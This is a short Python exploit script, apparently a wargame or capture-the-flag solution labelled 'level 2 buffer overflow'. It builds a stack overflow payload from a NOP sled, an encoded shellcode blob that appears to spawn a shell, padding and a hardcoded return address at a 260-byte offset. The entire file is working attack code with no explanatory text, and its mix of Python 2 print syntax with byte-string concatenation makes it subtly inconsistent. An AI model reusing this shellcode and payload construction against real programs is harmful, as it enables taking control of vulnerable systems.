#!/usr/bin/env python

# level 2 buffer overflow

import sys

def print_help():
    print("Usage: ./" + sys.argv[0] + "<padding>")

if len(sys.argv) < 2:
    print_help()
    sys.exit(1)

offset = 260
ret = '\xb0\xd1\xff\xff'
nop = '\x90'
padding = int(sys.argv[1])

shellcode =  b""
shellcode += b"\xbe\x8c\x9d\x84\x53\xda\xc4\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x0b\x31\x70\x15\x03\x70\x15"
shellcode += b"\x83\xc0\x04\xe2\x79\xf7\x8f\x0b\x18\x5a\xf6"
shellcode += b"\xc3\x37\x38\x7f\xf4\x2f\x91\x0c\x93\xaf\x85"
shellcode += b"\xdd\x01\xc6\x3b\xab\x25\x4a\x2c\xa3\xa9\x6a"
shellcode += b"\xac\x9b\xcb\x03\xc2\xcc\x78\xbb\x1a\x44\x2c"
shellcode += b"\xb2\xfa\xa7\x52"

payload = nop * (offset - len(shellcode) - padding) + shellcode + 'P' * padding + ret

print payload + " " + 'B'*512 
#print 'A'*263 + " " + 'B'*512
